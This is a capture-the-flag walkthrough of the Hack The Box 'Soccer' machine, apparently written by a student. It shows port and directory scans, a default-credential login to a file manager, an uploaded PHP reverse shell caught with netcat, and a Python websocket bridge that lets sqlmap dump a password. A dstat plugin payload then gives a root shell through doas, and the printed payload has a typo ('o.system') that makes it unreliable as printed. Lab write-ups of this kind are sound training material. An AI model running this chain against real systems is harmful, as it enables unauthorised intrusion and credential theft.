- Added `soccer.htb` to `/etc/hosts` .
- Scanned for ports on the machine .

```console
❯ rustscan -a soccer.htb --ulimit 5000 -- -sC -sV | tee rustscan.log
❯ cat rustscan.log
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: https://discord.gg/GFrQsGy           :
: https://github.com/RustScan/RustScan :
 --------------------------------------
Nmap? More like slowmap.🐢

[~] The config file is expected to be at "/home/divu050704/.rustscan.toml"
[~] Automatically increasing ulimit value to 5000.
Open 10.129.115.55:22
Open 10.129.115.55:80
[~] Starting Script(s)
[>] Script to be run Some("nmap -vvv -p {{port}} {{ip}}")

[~] Starting Nmap 7.92 ( https://nmap.org ) at 2022-12-19 14:37 IST
NSE: Loaded 155 scripts for scanning.
NSE: Script Pre-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 14:37
Completed NSE at 14:37, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 14:37
Completed NSE at 14:37, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 14:37
Completed NSE at 14:37, 0.00s elapsed
Initiating Ping Scan at 14:37
Scanning 10.129.115.55 [2 ports]
Completed Ping Scan at 14:37, 0.16s elapsed (1 total hosts)
Initiating Connect Scan at 14:37
Scanning soccer.htb (10.129.115.55) [2 ports]
Discovered open port 22/tcp on 10.129.115.55
Discovered open port 80/tcp on 10.129.115.55
Completed Connect Scan at 14:37, 0.16s elapsed (2 total ports)
Initiating Service scan at 14:37
Scanning 2 services on soccer.htb (10.129.115.55)
Completed Service scan at 14:37, 6.36s elapsed (2 services on 1 host)
NSE: Script scanning 10.129.115.55.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 14:37
Completed NSE at 14:37, 4.71s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 14:37
Completed NSE at 14:37, 0.64s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 14:37
Completed NSE at 14:37, 0.00s elapsed
Nmap scan report for soccer.htb (10.129.115.55)
Host is up, received syn-ack (0.16s latency).
Scanned at 2022-12-19 14:37:05 IST for 12s

PORT   STATE SERVICE REASON  VERSION
22/tcp open  ssh     syn-ack OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 ad:0d:84:a3:fd:cc:98:a4:78:fe:f9:49:15:da:e1:6d (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQChXu/2AxokRA9pcTIQx6HKyiO0odku5KmUpklDRNG+9sa6olMd4dSBq1d0rGtsO2rNJRLQUczml6+N5DcCasAZUShDrMnitsRvG54x8GrJyW4nIx4HOfXRTsNqImBadIJtvIww1L7H1DPzMZYJZj/oOwQHXvp85a2hMqMmoqsljtS/jO3tk7NUKA/8D5KuekSmw8m1pPEGybAZxlAYGu3KbasN66jmhf0ReHg3Vjx9e8FbHr3ksc/MimSMfRq0lIo5fJ7QAnbttM5ktuQqzvVjJmZ0+aL7ZeVewTXLmtkOxX9E5ldihtUFj8C6cQroX69LaaN/AXoEZWl/v1LWE5Qo1DEPrv7A6mIVZvWIM8/AqLpP8JWgAQevOtby5mpmhSxYXUgyii5xRAnvDWwkbwxhKcBIzVy4x5TXinVR7FrrwvKmNAG2t4lpDgmryBZ0YSgxgSAcHIBOglugehGZRHJC9C273hs44EToGCrHBY8n2flJe7OgbjEL8Il3SpfUEF0=
|   256 df:d6:a3:9f:68:26:9d:fc:7c:6a:0c:29:e9:61:f0:0c (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBIy3gWUPD+EqFcmc0ngWeRLfCr68+uiuM59j9zrtLNRcLJSTJmlHUdcq25/esgeZkyQ0mr2RZ5gozpBd5yzpdzk=
|   256 57:97:56:5d:ef:79:3c:2f:cb:db:35:ff:f1:7c:61:5c (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIJ2Pj1mZ0q8u/E8K49Gezm3jguM3d8VyAYsX0QyaN6H/
80/tcp open  http    syn-ack nginx 1.18.0 (Ubuntu)
|_http-title: Soccer - Index 
| http-methods: 
|_  Supported Methods: GET HEAD
|_http-server-header: nginx/1.18.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 14:37
Completed NSE at 14:37, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 14:37
Completed NSE at 14:37, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 14:37
Completed NSE at 14:37, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 12.86 seconds

```


- Started `gobuster` on the port and found `/tiny/`.

```gobuster
❯ gobuster dir --url http://soccer.htb -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt  -x php,js,txt,html  | tee gobuster.log
❯ cat gobuster.log
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://soccer.htb
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Extensions:              txt,html,php,js
[+] Timeout:                 10s
===============================================================
2022/12/19 11:44:31 Starting gobuster in directory enumeration mode
===============================================================
/index.html           (Status: 200) [Size: 6917]
/tiny                 (Status: 301) [Size: 178] [--> http://soccer.htb/tiny/]
```

- I would not lie, I was stuck here didn't even think about default credentials. 🐣
- Used default credentials for tiny file-manager `admin/admin@123` 
- Uploaded `php-reverse-shell.php` to `/tiny/uploads`, and got a shell.

```console
$ nc -lvnp 1234
listening on [any] 1234 ...
connect to [10.10.14.27] from (UNKNOWN) [10.129.115.55] 58894
Linux soccer 5.4.0-135-generic #152-Ubuntu SMP Wed Nov 23 20:19:22 UTC 2022 x86_64 x86_64 x86_64 GNU/Linux
 09:35:54 up  5:53,  0 users,  load average: 0.00, 0.01, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
bash: cannot set terminal process group (966): Inappropriate ioctl for device
bash: no job control in this shell
www-data@soccer:/$
```

- We are in 😎.
- Still we can't read `user.txt`, we need to escalate user to `player`. 
- Found sub-domain in `/etc/passwd` - `soc-player.soccer.htb` and added it to my `/etc/hosts`. 

```console
www-data@soccer:~$ cat /etc/hosts
127.0.0.1	localhost	soccer	soccer.htb	soc-player.soccer.htb

127.0.1.1	ubuntu-focal	ubuntu-focal
```

- Again scanned ports for `soc-player.soccer.htb`. 

```console
❯ rustscan -a soc-player.soccer.htb --ulimit 5000 -- -sC -sV  | tee rustscan-soc.log
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: https://discord.gg/GFrQsGy           :
: https://github.com/RustScan/RustScan :
 --------------------------------------
🌍HACK THE PLANET🌍

[~] The config file is expected to be at "/home/divu050704/.rustscan.toml"
[~] Automatically increasing ulimit value to 5000.
Open 10.129.115.55:22
Open 10.129.115.55:80
Open 10.129.115.55:9091
[~] Starting Script(s)
[>] Script to be run Some("nmap -vvv -p {{port}} {{ip}}")

[~] Starting Nmap 7.92 ( https://nmap.org ) at 2022-12-19 16:41 IST
NSE: Loaded 155 scripts for scanning.
NSE: Script Pre-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 16:41
Completed NSE at 16:41, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 16:41
Completed NSE at 16:41, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 16:41
Completed NSE at 16:41, 0.00s elapsed
Initiating Ping Scan at 16:41
Scanning 10.129.115.55 [2 ports]
Completed Ping Scan at 16:41, 0.16s elapsed (1 total hosts)
Initiating Connect Scan at 16:41
Scanning soccer.htb (10.129.115.55) [3 ports]
Discovered open port 22/tcp on 10.129.115.55
Discovered open port 80/tcp on 10.129.115.55
Discovered open port 9091/tcp on 10.129.115.55
Completed Connect Scan at 16:41, 0.15s elapsed (3 total ports)
Initiating Service scan at 16:41
Scanning 3 services on soccer.htb (10.129.115.55)
Completed Service scan at 16:42, 22.71s elapsed (3 services on 1 host)
NSE: Script scanning 10.129.115.55.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 16:42
Completed NSE at 16:42, 4.81s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 16:42
Completed NSE at 16:42, 0.64s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 16:42
Completed NSE at 16:42, 0.00s elapsed
Nmap scan report for soccer.htb (10.129.115.55)
Host is up, received syn-ack (0.16s latency).
Scanned at 2022-12-19 16:41:39 IST for 28s

PORT     STATE SERVICE         REASON  VERSION
22/tcp   open  ssh             syn-ack OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 ad:0d:84:a3:fd:cc:98:a4:78:fe:f9:49:15:da:e1:6d (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQChXu/2AxokRA9pcTIQx6HKyiO0odku5KmUpklDRNG+9sa6olMd4dSBq1d0rGtsO2rNJRLQUczml6+N5DcCasAZUShDrMnitsRvG54x8GrJyW4nIx4HOfXRTsNqImBadIJtvIww1L7H1DPzMZYJZj/oOwQHXvp85a2hMqMmoqsljtS/jO3tk7NUKA/8D5KuekSmw8m1pPEGybAZxlAYGu3KbasN66jmhf0ReHg3Vjx9e8FbHr3ksc/MimSMfRq0lIo5fJ7QAnbttM5ktuQqzvVjJmZ0+aL7ZeVewTXLmtkOxX9E5ldihtUFj8C6cQroX69LaaN/AXoEZWl/v1LWE5Qo1DEPrv7A6mIVZvWIM8/AqLpP8JWgAQevOtby5mpmhSxYXUgyii5xRAnvDWwkbwxhKcBIzVy4x5TXinVR7FrrwvKmNAG2t4lpDgmryBZ0YSgxgSAcHIBOglugehGZRHJC9C273hs44EToGCrHBY8n2flJe7OgbjEL8Il3SpfUEF0=
|   256 df:d6:a3:9f:68:26:9d:fc:7c:6a:0c:29:e9:61:f0:0c (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBIy3gWUPD+EqFcmc0ngWeRLfCr68+uiuM59j9zrtLNRcLJSTJmlHUdcq25/esgeZkyQ0mr2RZ5gozpBd5yzpdzk=
|   256 57:97:56:5d:ef:79:3c:2f:cb:db:35:ff:f1:7c:61:5c (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIJ2Pj1mZ0q8u/E8K49Gezm3jguM3d8VyAYsX0QyaN6H/
80/tcp   open  http            syn-ack nginx 1.18.0 (Ubuntu)
|_http-title: Soccer - Index 
| http-methods: 
|_  Supported Methods: GET HEAD
|_http-server-header: nginx/1.18.0 (Ubuntu)
9091/tcp open  xmltec-xmlmail? syn-ack
| fingerprint-strings: 
|   DNSStatusRequestTCP, DNSVersionBindReqTCP, Help, RPCCheck, SSLSessionReq, drda, informix: 
|     HTTP/1.1 400 Bad Request
|     Connection: close
|   GetRequest: 
|     HTTP/1.1 404 Not Found
|     Content-Security-Policy: default-src 'none'
|     X-Content-Type-Options: nosniff
|     Content-Type: text/html; charset=utf-8
|     Content-Length: 139
|     Date: Mon, 19 Dec 2022 11:11:52 GMT
|     Connection: close
|     <!DOCTYPE html>
|     <html lang="en">
|     <head>
|     <meta charset="utf-8">
|     <title>Error</title>
|     </head>
|     <body>
|     <pre>Cannot GET /</pre>
|     </body>
|     </html>
|   HTTPOptions: 
|     HTTP/1.1 404 Not Found
|     Content-Security-Policy: default-src 'none'
|     X-Content-Type-Options: nosniff
|     Content-Type: text/html; charset=utf-8
|     Content-Length: 143
|     Date: Mon, 19 Dec 2022 11:11:52 GMT
|     Connection: close
|     <!DOCTYPE html>
|     <html lang="en">
|     <head>
|     <meta charset="utf-8">
|     <title>Error</title>
|     </head>
|     <body>
|     <pre>Cannot OPTIONS /</pre>
|     </body>
|     </html>
|   RTSPRequest: 
|     HTTP/1.1 404 Not Found
|     Content-Security-Policy: default-src 'none'
|     X-Content-Type-Options: nosniff
|     Content-Type: text/html; charset=utf-8
|     Content-Length: 143
|     Date: Mon, 19 Dec 2022 11:11:53 GMT
|     Connection: close
|     <!DOCTYPE html>
|     <html lang="en">
|     <head>
|     <meta charset="utf-8">
|     <title>Error</title>
|     </head>
|     <body>
|     <pre>Cannot OPTIONS /</pre>
|     </body>
|_    </html>
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port9091-TCP:V=7.92%I=7%D=12/19%Time=63A046F1%P=x86_64-pc-linux-gnu%r(i
SF:nformix,2F,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nConnection:\x20close\
SF:r\n\r\n")%r(drda,2F,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nConnection:\
SF:x20close\r\n\r\n")%r(GetRequest,168,"HTTP/1\.1\x20404\x20Not\x20Found\r
SF:\nContent-Security-Policy:\x20default-src\x20'none'\r\nX-Content-Type-O
SF:ptions:\x20nosniff\r\nContent-Type:\x20text/html;\x20charset=utf-8\r\nC
SF:ontent-Length:\x20139\r\nDate:\x20Mon,\x2019\x20Dec\x202022\x2011:11:52
SF:\x20GMT\r\nConnection:\x20close\r\n\r\n<!DOCTYPE\x20html>\n<html\x20lan
SF:g=\"en\">\n<head>\n<meta\x20charset=\"utf-8\">\n<title>Error</title>\n<
SF:/head>\n<body>\n<pre>Cannot\x20GET\x20/</pre>\n</body>\n</html>\n")%r(H
SF:TTPOptions,16C,"HTTP/1\.1\x20404\x20Not\x20Found\r\nContent-Security-Po
SF:licy:\x20default-src\x20'none'\r\nX-Content-Type-Options:\x20nosniff\r\
SF:nContent-Type:\x20text/html;\x20charset=utf-8\r\nContent-Length:\x20143
SF:\r\nDate:\x20Mon,\x2019\x20Dec\x202022\x2011:11:52\x20GMT\r\nConnection
SF::\x20close\r\n\r\n<!DOCTYPE\x20html>\n<html\x20lang=\"en\">\n<head>\n<m
SF:eta\x20charset=\"utf-8\">\n<title>Error</title>\n</head>\n<body>\n<pre>
SF:Cannot\x20OPTIONS\x20/</pre>\n</body>\n</html>\n")%r(RTSPRequest,16C,"H
SF:TTP/1\.1\x20404\x20Not\x20Found\r\nContent-Security-Policy:\x20default-
SF:src\x20'none'\r\nX-Content-Type-Options:\x20nosniff\r\nContent-Type:\x2
SF:0text/html;\x20charset=utf-8\r\nContent-Length:\x20143\r\nDate:\x20Mon,
SF:\x2019\x20Dec\x202022\x2011:11:53\x20GMT\r\nConnection:\x20close\r\n\r\
SF:n<!DOCTYPE\x20html>\n<html\x20lang=\"en\">\n<head>\n<meta\x20charset=\"
SF:utf-8\">\n<title>Error</title>\n</head>\n<body>\n<pre>Cannot\x20OPTIONS
SF:\x20/</pre>\n</body>\n</html>\n")%r(RPCCheck,2F,"HTTP/1\.1\x20400\x20Ba
SF:d\x20Request\r\nConnection:\x20close\r\n\r\n")%r(DNSVersionBindReqTCP,2
SF:F,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nConnection:\x20close\r\n\r\n")
SF:%r(DNSStatusRequestTCP,2F,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nConnec
SF:tion:\x20close\r\n\r\n")%r(Help,2F,"HTTP/1\.1\x20400\x20Bad\x20Request\
SF:r\nConnection:\x20close\r\n\r\n")%r(SSLSessionReq,2F,"HTTP/1\.1\x20400\
SF:x20Bad\x20Request\r\nConnection:\x20close\r\n\r\n");
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 16:42
Completed NSE at 16:42, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 16:42
Completed NSE at 16:42, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 16:42
Completed NSE at 16:42, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 29.37 seconds
```

- We can see that the server is requesting `ws://soc-player.soccer.htb:9091/` , which seems like a database, made a python file which will act as mediator between `ws://soc-player.soccer.htb:9091/` and `sqlmap`.

![alt](https://github.com/divu050704/assets-holder/raw/main/tryhackme-screenshots/38.png)

```python
from http.server import SimpleHTTPRequestHandler
from socketserver import TCPServer
from urllib.parse import unquote, urlparse
from websocket import create_connection

ws_server = "ws://soc-player.soccer.htb:9091/"

def send_ws(payload):
	ws = create_connection(ws_server)
	# If the server returns a response on connect, use below line	
	#resp = ws.recv() # If server returns something like a token on connect you can find and extract from here
	
	# For our case, format the payload in JSON
	message = unquote(payload).replace('"','\'') # replacing " with ' to avoid breaking JSON structure
	data = '{"id":"%s"}' % message

	ws.send(data)
	resp = ws.recv()
	ws.close()

	if resp:
		return resp
	else:
		return ''

def middleware_server(host_port,content_type="text/plain"):

	class CustomHandler(SimpleHTTPRequestHandler):
		def do_GET(self) -> None:
			self.send_response(200)
			try:
				payload = urlparse(self.path).query.split('=',1)[1]
			except IndexError:
				payload = False
				
			if payload:
				content = send_ws(payload)
			else:
				content = 'No parameters specified!'

			self.send_header("Content-type", content_type)
			self.end_headers()
			self.wfile.write(content.encode())
			return

	class _TCPServer(TCPServer):
		allow_reuse_address = True

	httpd = _TCPServer(host_port, CustomHandler)
	httpd.serve_forever()


print("[+] Starting MiddleWare Server")
print("[+] Send payloads in http://localhost:8081/?id=*")

try:
	middleware_server(('0.0.0.0',8081))
except KeyboardInterrupt:
	pass
```

- Now started this server and started `sqlmap` on this server.

```console
❯ python3 server.py
[+] Starting MiddleWare Server
[+] Send payloads in http://localhost:8081/?id=*
```

```console
❯ sqlmap -u "http://localhost:8081/?id=55036" --batch --dbms
<-----------snip-------------->
sqlmap identified the following injection point(s) with a total of 241 HTTP(s) requests:
---
Parameter: id (GET)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: id=55036 AND 7083=7083

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: id=55036 AND (SELECT 9361 FROM (SELECT(SLEEP(5)))GEfg)
---
back-end DBMS: MySQL >= 5.0.12
available databases [5]:
[*] information_schema
[*] mysql
[*] performa
[*] soccer_db
[*] sys
```

- Scanned for tables under `soccer_db`

```console
❯ sqlmap -u "http://localhost:8081/?id=55036" --batch --dbms=soccer_db --tables
<----------------snip------------------>
back-end DBMS: MySQL 8
Database: soccer_db
[1 table]
+----------+
| accounts |
+----------+
```

- Scanned for columns under table `accounts` and dumped them.

```console
❯ sqlmap -u "http://localhost:8081/?id=55036" --batch --dbms=soccer_db -T accounts --column email,password --dump
<-------------------snip---------------------->
back-end DBMS: MySQL 8
Database: soccer_db
Table: accounts
[1 entry]
+-------------------+----------------------+
| email             | password             |
+-------------------+----------------------+
| player@player.htb | PlayerOftheMatch2022 |
+-------------------+----------------------+
```

- Logged into machine as `player` via ssh.

```console
❯ ssh player@soccer.htb
The authenticity of host 'soccer.htb (10.129.115.55)' can't be established.
ED25519 key fingerprint is SHA256:PxRZkGxbqpmtATcgie2b7E8Sj3pw1L5jMEqe77Ob3FE.
This key is not known by any other names
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added 'soccer.htb' (ED25519) to the list of known hosts.
player@soccer.htb's password: 
Welcome to Ubuntu 20.04.5 LTS (GNU/Linux 5.4.0-135-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Mon Dec 19 11:12:23 UTC 2022

  System load:           0.01
  Usage of /:            72.2% of 3.84GB
  Memory usage:          24%
  Swap usage:            0%
  Processes:             230
  Users logged in:       0
  IPv4 address for eth0: 10.129.115.55
  IPv6 address for eth0: dead:beef::250:56ff:fe96:98b2

 * Strictly confined Kubernetes makes edge and IoT secure. Learn how MicroK8s
   just raised the bar for easy, resilient and secure K8s cluster deployment.

   https://ubuntu.com/engage/secure-kubernetes-at-the-edge

0 updates can be applied immediately.


Last login: Tue Dec 13 07:29:10 2022 from 10.10.14.19
player@soccer:~$ cat user.txt 
3084811486cee284c5a1c89acb91c610
```

- Searched for `SUIDs` and found `doas`. 

```console
player@soccer:~$ find / -perm -u=s -type f 2>/dev/null 
/usr/local/bin/doas
/usr/lib/snapd/snap-confine
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/openssh/ssh-keysign
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/eject/dmcrypt-get-device
/usr/bin/umount
/usr/bin/fusermount
/usr/bin/mount
/usr/bin/su
/usr/bin/newgrp
/usr/bin/chfn
/usr/bin/sudo
/usr/bin/passwd
/usr/bin/gpasswd
/usr/bin/chsh
/usr/bin/at
/snap/snapd/17883/usr/lib/snapd/snap-confine
/snap/core20/1695/usr/bin/chfn
/snap/core20/1695/usr/bin/chsh
/snap/core20/1695/usr/bin/gpasswd
/snap/core20/1695/usr/bin/mount
/snap/core20/1695/usr/bin/newgrp
/snap/core20/1695/usr/bin/passwd
/snap/core20/1695/usr/bin/su
/snap/core20/1695/usr/bin/sudo
/snap/core20/1695/usr/bin/umount
/snap/core20/1695/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/snap/core20/1695/usr/lib/openssh/ssh-keysign
```

- Created `dstat_escalate.py` in `/usr/local/share/dstat`, with python privilege escalation payload

```python
import os
os.setuid(0)
o.system("/bin/bash -p")
```

- Next run it with `doas` as `root`.

```console
player@soccer:/usr/local/share/dstat$ doas -u root /usr/bin/dstat --escalate
/usr/bin/dstat:2619: DeprecationWarning: the imp module is deprecated in favour of importlib; see the module's documentation for alternative uses
  import imp
root@soccer:/usr/local/share/dstat#
root@soccer:/usr/local/share/dstat# cd
root@soccer:~# ls
app  root.txt  run.sql  snap
root@soccer:~# cat root.txt 
323b703e31074215647ce2238b04e580
root@soccer:~# 

```
